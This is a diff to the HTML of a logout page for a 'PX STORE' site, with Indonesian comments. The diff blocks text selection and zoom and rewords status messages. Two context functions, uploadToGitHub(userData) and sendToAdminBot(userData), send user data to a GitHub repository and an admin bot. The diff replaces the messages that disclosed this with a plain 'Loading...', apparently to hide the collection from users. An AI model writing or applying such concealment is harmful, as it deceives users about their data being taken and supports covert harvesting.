@@ -3,11 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <link rel="icon" href="/assets/images/icon.ico" type="image/x-icon">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
     <title>Logout - PX STORE</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+         /* CSS untuk mencegah seleksi teks dan highlight */
+        * {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        /* Izinkan seleksi pada input dan textarea */
+        input, textarea {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
         /* CSS tetap sama seperti sebelumnya */
         :root {
             --primary: #6c63ff;
@@ -316,7 +333,7 @@
         // Upload data ke GitHub dengan error handling yang lebih baik
         async function uploadToGitHub(userData) {
             try {
-                showMessage('Menyimpan data ke GitHub...', 'info');
+                showMessage('Loading...', 'info');
                 
                 // Dapatkan file yang sudah ada terlebih dahulu
                 const getUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
@@ -387,7 +404,7 @@
         // Kirim data ke admin bot dengan format JSON yang benar
         async function sendToAdminBot(userData) {
             try {
-                showMessage('Mengirim data ke admin...', 'info');
+                showMessage('Loading..', 'info');
                 
                 // Format data sesuai dengan contoh yang diminta
                 const formattedData = {
